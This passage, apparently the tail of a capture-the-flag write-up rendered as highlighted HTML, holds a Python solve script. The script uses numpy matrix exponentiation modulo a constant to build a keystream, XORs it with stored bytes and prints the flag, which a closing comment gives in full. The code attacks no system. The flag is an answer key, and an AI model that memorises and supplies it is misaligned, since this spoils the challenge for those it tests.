<span class="line"><span style="color:var(--astro-code-color-text)">        M </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">array</span><span style="color:var(--astro-code-token-punctuation)">([[</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">], [</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">], [</span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">]])</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">        MF </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">dot</span><span style="color:var(--astro-code-token-punctuation)">(M, MF)</span><span style="color:var(--astro-code-token-keyword)"> %</span><span style="color:var(--astro-code-color-text)"> MOD</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">    elif</span><span style="color:var(--astro-code-color-text)"> var16 </span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-constant)"> 3</span><span style="color:var(--astro-code-token-keyword)"> ==</span><span style="color:var(--astro-code-token-constant)"> 1</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">        M </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">array</span><span style="color:var(--astro-code-token-punctuation)">([[</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">], [</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">], [</span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">]])</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">        MF </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">dot</span><span style="color:var(--astro-code-token-punctuation)">(M, MF)</span><span style="color:var(--astro-code-token-keyword)"> %</span><span style="color:var(--astro-code-color-text)"> MOD</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">    elif</span><span style="color:var(--astro-code-color-text)"> var16 </span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-constant)"> 3</span><span style="color:var(--astro-code-token-keyword)"> ==</span><span style="color:var(--astro-code-token-constant)"> 2</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">        M </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">array</span><span style="color:var(--astro-code-token-punctuation)">([[</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">], [</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">], [</span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">]])</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">        MF </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">dot</span><span style="color:var(--astro-code-token-punctuation)">(M, MF)</span><span style="color:var(--astro-code-token-keyword)"> %</span><span style="color:var(--astro-code-color-text)"> MOD</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">def</span><span style="color:var(--astro-code-token-function)"> matpow</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-parameter)">M</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-parameter)"> n</span><span style="color:var(--astro-code-color-text)">):</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">    if</span><span style="color:var(--astro-code-color-text)"> n </span><span style="color:var(--astro-code-token-keyword)">==</span><span style="color:var(--astro-code-token-constant)"> 0</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">        return</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">eye</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-constant)">3</span><span style="color:var(--astro-code-token-punctuation)">, dtype</span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)">int</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">    if</span><span style="color:var(--astro-code-color-text)"> n </span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-constant)"> 2</span><span style="color:var(--astro-code-token-keyword)"> ==</span><span style="color:var(--astro-code-token-constant)"> 0</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">        return</span><span style="color:var(--astro-code-token-function)"> matpow</span><span style="color:var(--astro-code-token-punctuation)">(np.</span><span style="color:var(--astro-code-token-function)">dot</span><span style="color:var(--astro-code-token-punctuation)">(M, M) </span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-punctuation)"> MOD, n </span><span style="color:var(--astro-code-token-keyword)">//</span><span style="color:var(--astro-code-token-constant)"> 2</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">    return</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">dot</span><span style="color:var(--astro-code-token-punctuation)">(M, </span><span style="color:var(--astro-code-token-function)">matpow</span><span style="color:var(--astro-code-token-punctuation)">(M, n </span><span style="color:var(--astro-code-token-keyword)">-</span><span style="color:var(--astro-code-token-constant)"> 1</span><span style="color:var(--astro-code-token-punctuation)">))</span><span style="color:var(--astro-code-token-keyword)"> %</span><span style="color:var(--astro-code-color-text)"> MOD</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">v </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">array</span><span style="color:var(--astro-code-token-punctuation)">([</span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">2</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">3</span><span style="color:var(--astro-code-token-punctuation)">])</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">MA </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">eye</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-constant)">3</span><span style="color:var(--astro-code-token-punctuation)">, dtype</span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)">int</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">LMOD </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> (MOD </span><span style="color:var(--astro-code-token-keyword)">**</span><span style="color:var(--astro-code-token-constant)"> 9</span><span style="color:var(--astro-code-token-keyword)"> +</span><span style="color:var(--astro-code-token-constant)"> 1</span><span style="color:var(--astro-code-color-text)">) </span><span style="color:var(--astro-code-token-keyword)">*</span><span style="color:var(--astro-code-token-constant)"> 15</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">for</span><span style="color:var(--astro-code-color-text)"> var14 </span><span style="color:var(--astro-code-token-keyword)">in</span><span style="color:var(--astro-code-token-function)"> range</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">50</span><span style="color:var(--astro-code-token-punctuation)">):</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">    if</span><span style="color:var(--astro-code-color-text)"> var14 </span><span style="color:var(--astro-code-token-keyword)">&#x3C;</span><span style="color:var(--astro-code-token-constant)"> 25</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">        var6 </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)"> 3</span><span style="color:var(--astro-code-token-keyword)"> **</span><span style="color:var(--astro-code-color-text)"> var14</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">        pcom</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-color-text)"> prem </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> var6 </span><span style="color:var(--astro-code-token-keyword)">//</span><span style="color:var(--astro-code-token-constant)"> 15</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-color-text)"> var6 </span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-constant)"> 15</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">    else</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">        ttl </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> (</span><span style="color:var(--astro-code-token-constant)">15</span><span style="color:var(--astro-code-token-keyword)"> *</span><span style="color:var(--astro-code-color-text)"> pcom </span><span style="color:var(--astro-code-token-keyword)">+</span><span style="color:var(--astro-code-color-text)"> prem) </span><span style="color:var(--astro-code-token-keyword)">**</span><span style="color:var(--astro-code-token-constant)"> 3</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">        pcom </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> (ttl </span><span style="color:var(--astro-code-token-keyword)">//</span><span style="color:var(--astro-code-token-constant)"> 15</span><span style="color:var(--astro-code-color-text)">) </span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)"> LMOD</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">        prem </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> ttl </span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-constant)"> 15</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    MA </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-function)"> matpow</span><span style="color:var(--astro-code-token-punctuation)">(MF, pcom)</span><span style="color:var(--astro-code-token-keyword)"> %</span><span style="color:var(--astro-code-color-text)"> MOD</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">    for</span><span style="color:var(--astro-code-color-text)"> var16 </span><span style="color:var(--astro-code-token-keyword)">in</span><span style="color:var(--astro-code-token-function)"> range</span><span style="color:var(--astro-code-token-punctuation)">(prem):</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">        if</span><span style="color:var(--astro-code-color-text)"> var16 </span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-constant)"> 3</span><span style="color:var(--astro-code-token-keyword)"> ==</span><span style="color:var(--astro-code-token-constant)"> 0</span><span style="color:var(--astro-code-token-keyword)"> and</span><span style="color:var(--astro-code-color-text)"> var16 </span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-constant)"> 5</span><span style="color:var(--astro-code-token-keyword)"> ==</span><span style="color:var(--astro-code-token-constant)"> 0</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">            M </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">array</span><span style="color:var(--astro-code-token-punctuation)">([[</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">], [</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">], [</span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">]])</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">            MA </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">dot</span><span style="color:var(--astro-code-token-punctuation)">(M, MA)</span><span style="color:var(--astro-code-token-keyword)"> %</span><span style="color:var(--astro-code-color-text)"> MOD</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">        elif</span><span style="color:var(--astro-code-color-text)"> var16 </span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-constant)"> 3</span><span style="color:var(--astro-code-token-keyword)"> ==</span><span style="color:var(--astro-code-token-constant)"> 0</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">            M </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">array</span><span style="color:var(--astro-code-token-punctuation)">([[</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">], [</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">], [</span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">]])</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">            MA </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">dot</span><span style="color:var(--astro-code-token-punctuation)">(M, MA)</span><span style="color:var(--astro-code-token-keyword)"> %</span><span style="color:var(--astro-code-color-text)"> MOD</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">        elif</span><span style="color:var(--astro-code-color-text)"> var16 </span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-constant)"> 3</span><span style="color:var(--astro-code-token-keyword)"> ==</span><span style="color:var(--astro-code-token-constant)"> 1</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">            M </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">array</span><span style="color:var(--astro-code-token-punctuation)">([[</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">], [</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">], [</span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">]])</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">            MA </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">dot</span><span style="color:var(--astro-code-token-punctuation)">(M, MA)</span><span style="color:var(--astro-code-token-keyword)"> %</span><span style="color:var(--astro-code-color-text)"> MOD</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">        elif</span><span style="color:var(--astro-code-color-text)"> var16 </span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-constant)"> 3</span><span style="color:var(--astro-code-token-keyword)"> ==</span><span style="color:var(--astro-code-token-constant)"> 2</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">            M </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">array</span><span style="color:var(--astro-code-token-punctuation)">([[</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">], [</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">], [</span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">]])</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">            MA </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">dot</span><span style="color:var(--astro-code-token-punctuation)">(M, MA)</span><span style="color:var(--astro-code-token-keyword)"> %</span><span style="color:var(--astro-code-color-text)"> MOD</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    v </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">array</span><span style="color:var(--astro-code-token-punctuation)">([</span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">2</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">3</span><span style="color:var(--astro-code-token-punctuation)">])</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    v </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">dot</span><span style="color:var(--astro-code-token-punctuation)">(MA, v)</span><span style="color:var(--astro-code-token-keyword)"> %</span><span style="color:var(--astro-code-color-text)"> MOD</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    var19</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-color-text)"> var20</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-color-text)"> var21 </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> v</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    var23 </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> var12</span><span style="color:var(--astro-code-token-punctuation)">[</span><span style="color:var(--astro-code-color-text)">var14</span><span style="color:var(--astro-code-token-punctuation)">]</span><span style="color:var(--astro-code-token-keyword)"> ^</span><span style="color:var(--astro-code-color-text)"> (var19 </span><span style="color:var(--astro-code-token-keyword)">&#x26;</span><span style="color:var(--astro-code-token-constant)"> 255</span><span style="color:var(--astro-code-color-text)">)</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">    print</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-function)">chr</span><span style="color:var(--astro-code-token-punctuation)">(var23), end</span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-string-expression)">""</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    sys</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-color-text)">stdout</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">flush</span><span style="color:var(--astro-code-token-punctuation)">()</span></span>
<span class="line"><span style="color:var(--astro-code-token-comment)"># bctf{we1rd_pyth0nc0d3_so1v3_w1th_f4s7_M47r1x_Mu1t}</span></span>
<span class="line"></span></code></pre> </div>  </div> </body></html>